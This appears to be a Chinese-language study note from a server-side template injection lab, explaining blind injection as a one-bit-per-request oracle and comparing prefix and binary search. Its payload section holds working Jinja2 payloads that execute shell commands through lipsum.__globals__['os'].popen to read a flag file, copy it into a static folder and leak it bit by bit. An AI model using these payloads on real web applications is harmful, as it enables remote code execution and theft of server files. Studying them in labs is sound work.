## 二、知识点

- **盲注的本质是信息论**：一次请求 1 bit，脚本负责「提问 → 读 1 bit → 缩小范围」
- **oracle 三件套**：能执行命令的链 + 把条件变成响应差异的模板（`{% if %}…{% else %}{{1/0}}{% endif %}`）+ 带终止条件的循环
- **前缀法 vs 二分法**：理解成本 vs 请求量（31 位：856 次 vs 242 次）
- **结果通道可以有三种**：响应体（第 1、2 关）→ 磁盘 + 静态路由（第 3 关外带）→ 1 bit 盲注（第 3 关 oracle）

## 三、案例 / payload

```jinja
{% set x = lipsum.__globals__['os'].popen('cat /app/flag > /app/static/l3.txt').read() %}   # 外带：写进静态目录
{% if lipsum.__globals__['os'].popen('cat /app/flag').read().startswith('SSTILAB') %}a{% else %}{{1/0}}{% endif %}   # 盲注 oracle
```

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| 本地 Windows 跑盲注脚本读不到文件 | cmd 的 `type` 不认正斜杠、也不认中文路径 | 本地改用 `--read open`（走 `__builtins__.open`） |
| 模板拼字符串报 `ValueError` | payload 含 `%}`，和 Python 的 `%` 格式化冲突 | 一律用 `+` 拼接 |
| 长度 oracle 多算一位 | flag 文件末尾有换行 | 读到 `}` 就停 |
